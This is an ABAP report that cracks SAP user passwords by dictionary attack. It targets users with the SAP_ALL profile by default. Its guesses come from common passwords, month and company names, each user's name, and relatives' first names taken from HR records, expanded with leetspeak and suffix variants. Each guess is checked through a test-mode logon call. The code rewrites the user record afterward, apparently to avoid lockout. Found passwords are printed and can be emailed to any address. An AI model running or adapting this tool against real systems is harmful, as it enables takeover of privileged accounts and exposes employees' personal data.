REPORT zdiccpwd.

TABLES: adrp, usr21, usr02, bkpf.
DATA: user(8).
DATA: password LIKE xu400-newcode.

DATA: user_logondata LIKE uslogond.
DATA: user_name LIKE usr02-bname.
DATA: old_key LIKE user_logondata-bcode.
DATA: pwd_found,
      v_ok.

DATA: l_cont(4) TYPE c,
      l_string  LIKE xu400-newcode,
      l_string1 LIKE xu400-newcode,
      l_string2 LIKE xu400-newcode,
      l_string3 LIKE xu400-newcode,
      l_string4 LIKE xu400-newcode.

DATA: auth_rec LIKE ust04.
DATA: auth_tab LIKE TABLE OF auth_rec.

DATA: BEGIN OF usr_rec,
        mandt LIKE usr02-mandt,
        bname LIKE usr02-bname,
        bcode LIKE usr02-bcode,
        uflag LIKE usr02-uflag,
      END OF usr_rec.
DATA: usr_tab LIKE TABLE OF usr_rec.


DATA: BEGIN OF pwd_rec,
        string LIKE xu400-newcode,
      END OF pwd_rec.
DATA: BEGIN OF pwd_tab OCCURS 0,
        string   LIKE xu400-newcode,
        todos,
        password,
      END OF pwd_tab,
      pwd_tab2      LIKE pwd_tab OCCURS 0,
      v_gjahr_desde TYPE gjahr,
      v_gjahr_hasta TYPE gjahr,
      v_gjahr       TYPE gjahr,
      v_monat_desde TYPE monat,
      v_monat_hasta TYPE monat,
      v_monat       TYPE monat,
      i_texto       TYPE rspc_t_text.


SELECT-OPTIONS: s_name FOR usr21-bname.
PARAMETERS: p_sapall AS CHECKBOX DEFAULT 'X'.
PARAMETERS: v_times TYPE i DEFAULT 9.
SELECT-OPTIONS: s_gjahr FOR bkpf-gjahr DEFAULT sy-datum(4) NO-EXTENSION,
                s_monat FOR bkpf-monat DEFAULT sy-datum+2(2) NO-EXTENSION.
PARAMETERS: p_pass01 LIKE xu400-newcode,
            p_pass02 LIKE xu400-newcode,
            p_pass03 LIKE xu400-newcode,
            p_pass04 LIKE xu400-newcode,
            p_pass05 LIKE xu400-newcode,
            p_pass06 LIKE xu400-newcode,
            p_pass07 LIKE xu400-newcode,
            p_pass08 LIKE xu400-newcode,
            p_pass09 LIKE xu400-newcode,
            p_pass10 LIKE xu400-newcode.

PARAMETERS: p_log  AS CHECKBOX,
            p_mail TYPE text255.

DEFINE docont.
  l_string2 = l_string.
  DO v_times TIMES.
    l_cont = sy-index.
    CONCATENATE l_string l_cont INTO pwd_tab-string.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
    CONCATENATE l_string l_cont INTO pwd_tab-string SEPARATED BY '-'.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
  ENDDO.

  v_gjahr = v_gjahr_desde.
  while v_gjahr <= v_gjahr_hasta.
    CONCATENATE l_string2 v_gjahr INTO pwd_tab-string.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
    CONCATENATE l_string2 v_gjahr INTO pwd_tab-string SEPARATED BY '-'.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
    add 1 to v_gjahr.
  ENDWHILE.

  v_monat = v_monat_desde.
  while v_monat <= v_monat_hasta.
    CONCATENATE l_string2 v_monat INTO pwd_tab-string.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
    CONCATENATE l_string2 v_monat INTO pwd_tab-string SEPARATED BY '-'.
    CONDENSE pwd_tab-string NO-GAPS.
    APPEND pwd_tab.
    add 1 to v_monat.
  ENDWHILE.

END-OF-DEFINITION.

DEFINE: addt.
  CLEAR pwd_tab.
  pwd_tab-string = &1.
  pwd_tab-todos  = 'X'.
  APPEND pwd_tab.
  l_string = l_string1 = pwd_tab-string.
  docont.

  pwd_tab-string = &1.
  TRANSLATE pwd_tab-string TO UPPER CASE.
  l_string = pwd_tab-string.
  docont.

  pwd_tab-string = &1.
  TRANSLATE pwd_tab-string TO LOWER CASE.
  APPEND pwd_tab.
  l_string = pwd_tab-string.
  TRANSLATE l_string TO LOWER CASE.
  docont.

END-OF-DEFINITION.

DEFINE: addp.
  CLEAR pwd_tab.
  pwd_tab-string = &1.
  TRANSLATE pwd_tab-string(1) TO UPPER CASE.
  TRANSLATE pwd_tab-string+1 TO LOWER CASE.
  APPEND pwd_tab.

  CLEAR pwd_tab.
  pwd_tab-string = &1.
  TRANSLATE pwd_tab-string TO UPPER CASE.
  APPEND pwd_tab.
  l_string = pwd_tab-string.
  docont.
  TRANSLATE pwd_tab-string TO LOWER CASE.
  APPEND pwd_tab.
  TRANSLATE l_string TO LOWER CASE.
  docont.
END-OF-DEFINITION.

DEFINE: addtn.
  IF NOT p_pass&1 IS INITIAL.
    addt: p_pass&1.
  ENDIF.
END-OF-DEFINITION.

READ TABLE s_gjahr INDEX 1.
IF sy-subrc = 0.
  v_gjahr_desde = s_gjahr-low.
  IF s_gjahr-high IS INITIAL.
    v_gjahr_hasta = s_gjahr-low.
  ELSE.
    v_gjahr_hasta = s_gjahr-high.
  ENDIF.
ENDIF.

READ TABLE s_monat INDEX 1.
IF sy-subrc = 0.
  v_monat_desde = s_monat-low.
  IF s_monat-high IS INITIAL.
    v_monat_hasta = s_monat-low.
  ELSE.
    v_monat_hasta = s_monat-high.
  ENDIF.
ENDIF.

addt: 'Pass', '06071992', '6071992', '19920706', 'ADMIN', 'TS1MBHSS', 'SP3ED#UP', '$1Pawd2&', 'Support',
      'HEINEKEN', 'Inicial', 'Init', 'Password', 'VERANDER', 'Inicio', 'Ini', 'Sap', 'Abap', '1234567', 'Abcdefgh',
      'AJAX', 'EXPORT', 'Valencia', 'Clave', 'Contrasena',
      'Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre',
      'Ene', 'Feb', 'Mar', 'Abr', 'May', 'Jun', 'Jul', 'Ago', 'Sep', 'Oct', 'Nov', 'Dic',
      'Stadler', 'Vossloh',
      '123456', '123456789', '12345678', '12345', '111111', '1234567', 'Qwerty', 'Admin', 'Welcome', '666666', 'Abc123', '123123',
      '654321', 'aa123456', 'Sothis', 'Seidor', 'Stratesys'.

addtn: 01, 02, 03, 04, 05, 06, 07, 08, 09, 10.

SELECT mandt bname bcode uflag FROM usr02
    APPENDING TABLE usr_tab
  WHERE bname IN s_name.
SORT usr_tab.

DATA(pwd_tab_ini) = pwd_tab[].

LOOP AT usr_tab INTO usr_rec.

  pwd_tab[] = pwd_tab_ini[].
  IF p_sapall = 'X'.
    SELECT SINGLE bname FROM ust04
      INTO usr_rec-bname
     WHERE bname   = usr_rec-bname
       AND profile = 'SAP_ALL'.
    IF sy-subrc NE 0.
      CONTINUE.
    ENDIF.
  ENDIF.

  CALL FUNCTION 'SAPGUI_PROGRESS_INDICATOR'
    EXPORTING
      text   = usr_rec-bname
    EXCEPTIONS
      OTHERS = 1.

  CLEAR v_ok.

  CALL FUNCTION 'SUSR_USER_LOGONDATA_GET'
    EXPORTING
      user_name           = usr_rec-bname
    IMPORTING
      user_logondata      = user_logondata
    EXCEPTIONS
      user_name_not_exist = 1
      OTHERS              = 2.

  old_key = user_logondata-bcode.

  DELETE pwd_tab WHERE todos = ''.

  addp usr_rec-bname.

  SELECT SINGLE * FROM usr21
   WHERE bname = usr_rec-bname.

  SELECT SINGLE * FROM adrp
   WHERE persnumber = usr21-persnumber.

  addp adrp-name_first.

  SPLIT adrp-name_last AT ' ' INTO l_string3
                                   l_string4.
  addp l_string3.
  addp l_string4.

  CONCATENATE adrp-name_first(1) l_string3 INTO l_string.
  addp l_string.

  CONCATENATE adrp-name_first l_string3(1) l_string4(1) INTO l_string.
  addp l_string.

  CONCATENATE adrp-name_first(1) l_string3(1) l_string4(1) INTO l_string.
  addp l_string.

  DATA: l_pernr TYPE persno.
  SELECT SINGLE pernr FROM pa0105
    INTO l_pernr
   WHERE ( usrid_long = usr_rec-bname
      OR   usrid = usr_rec-bname )
     AND endda >= sy-datum
     AND begda <= sy-datum.
  IF sy-subrc = 0.
    SELECT favor FROM pa0021
      INTO l_string
     WHERE pernr = l_pernr.
      addp l_string.
    ENDSELECT.
  ENDIF.


  SORT pwd_tab.
  DELETE ADJACENT DUPLICATES FROM pwd_tab.
  DELETE pwd_tab WHERE string = ''.

  pwd_tab2[] = pwd_tab[].
  LOOP AT pwd_tab2 INTO pwd_tab.
    DO 3 TIMES.
      REPLACE 'i' WITH '1' INTO pwd_tab-string.
      REPLACE 'I' WITH '1' INTO pwd_tab-string.
      REPLACE 'o' WITH '0' INTO pwd_tab-string.
      REPLACE 'O' WITH '0' INTO pwd_tab-string.
      REPLACE 'a' WITH '@' INTO pwd_tab-string.
      REPLACE 'A' WITH '@' INTO pwd_tab-string.
    ENDDO.
    APPEND pwd_tab.
  ENDLOOP.

  pwd_tab2[] = pwd_tab[].
  LOOP AT pwd_tab2 INTO pwd_tab.
    TRANSLATE pwd_tab-string(1) TO UPPER CASE.
    TRANSLATE pwd_tab-string+1 TO LOWER CASE.
    APPEND pwd_tab.

    TRANSLATE pwd_tab-string TO LOWER CASE.
    APPEND pwd_tab.
    TRANSLATE pwd_tab-string TO UPPER CASE.
    APPEND pwd_tab.
  ENDLOOP.

  pwd_tab2[] = pwd_tab[].
  LOOP AT pwd_tab2 INTO pwd_tab.
    l_string = pwd_tab-string.
    CONCATENATE pwd_tab-string '123' INTO pwd_tab-string.
    APPEND pwd_tab.

    CONCATENATE l_string '-123' INTO pwd_tab-string.
    APPEND pwd_tab.
  ENDLOOP.

  SORT pwd_tab.
  DELETE ADJACENT DUPLICATES FROM pwd_tab.

  LOOP AT pwd_tab INTO pwd_rec.
    PERFORM tryout USING usr_rec-bname pwd_rec-string.
    IF v_ok = 'X'.
      EXIT.
    ENDIF.
  ENDLOOP.

  IF v_ok IS INITIAL.
    APPEND |Usuario: { usr_rec-bname } No se ha encontrado| TO i_texto.
  ENDIF.
ENDLOOP.

IF NOT p_mail IS INITIAL.
  zcl_ap_envio_mail=>mail( subject = 'Búsqueda' direccion = p_mail i_textos = i_texto ).
ENDIF.

*---------------------------------------------------------------------*
*       FORM TRYOUT                                                   *
*---------------------------------------------------------------------*
FORM tryout USING user_name LIKE usr02-bname
                  password  LIKE xu400-newcode.

  DATA: new_key LIKE user_logondata-bcode.

  IF p_log = 'X'.
    WRITE: / user_name, password.
  ENDIF.

  SELECT SINGLE * FROM usr02
   WHERE bname = user_name.
  CHECK sy-subrc  = 0.

*   CALL FUNCTION 'SUSR_USER_PASSWORD_PUT'
*     EXPORTING
*       user_name            = user_name
*       password             = password
*     EXCEPTIONS
*       user_name_not_exist  = 1
*       password_not_allowed = 2
*       passwords_not_equal  = 3
*       OTHERS               = 4.


*   CALL FUNCTION 'SUSR_LOGIN_CHECK_RFC'
*     EXPORTING
*       bname                     = user_name
*       password                  = password
**      XBCODE                    = XBCODE
**      XCODVN                    = XCODVN
**      USE_NEW_EXCEPTION         = 0
*     EXCEPTIONS
*       wait                      = 1
*       user_locked               = 2
*       user_not_active           = 3
*       password_expired          = 4
*       wrong_password            = 5
*       no_check_for_this_user    = 6
*       password_attempts_limited = 7
*       internal_error            = 8.


  DATA: pwdstate  TYPE xupwdstate,
        bname     LIKE rsyst-bname,
        passwordx LIKE rsyst-bcode.

  bname = user_name.
  passwordx = password.
  CALL 'INTERNET_USER_LOGON'  ID 'AUTHTYPE'  FIELD 'P'   "password
                              ID 'TESTMODE'  FIELD 'X'
                              ID 'UNAME'     FIELD bname
                              ID 'PASSW'     FIELD passwordx
                              ID 'PASSFLAG'  FIELD pwdstate.
  IF sy-subrc = 0.
    CALL FUNCTION 'SUSR_USER_LOGONDATA_GET'
      EXPORTING
        user_name           = user_name
      IMPORTING
        user_logondata      = user_logondata
      EXCEPTIONS
        user_name_not_exist = 1
        OTHERS              = 2.

    IF sy-subrc = 0.
      new_key = user_logondata-bcode.

      IF old_key = new_key.
        v_ok = 'X'.
        PERFORM show_user USING password.
      ENDIF.
    ENDIF.
  ENDIF.

*   UPDATE usr02
*     SET uflag = 0
*         locnt = 0
*         pwdlockdate = '00000000'
*    WHERE bname = user_name.

  MODIFY usr02 FROM usr02.
  COMMIT WORK AND WAIT.

ENDFORM."tryout

*&---------------------------------------------------------------------*
*&      Form  show_user
*&---------------------------------------------------------------------*
FORM show_user USING password.
  DATA l_bloq TYPE string.

  WRITE: / 'Usuario   :', usr_rec-bname.
  WRITE: / 'Password  :', password.
  WRITE: / 'Status    :'.
  IF usr_rec-uflag = 0.
    WRITE: 'no bloqueado'.
  ELSE.
    WRITE: 'bloqueado'.
    l_bloq = 'BLOQUEADO'.
  ENDIF.
  SELECT * FROM ust04 INTO TABLE auth_tab
    WHERE bname = usr_rec-bname.
  WRITE: / 'Profiles  :'.
  LOOP AT auth_tab INTO auth_rec.
    WRITE auth_rec-profile.
  ENDLOOP.
  ULINE.
  CLEAR pwd_found.


  APPEND |Usuario: { usr_rec-bname } Password { password } { l_bloq }| TO i_texto.

ENDFORM." show_user
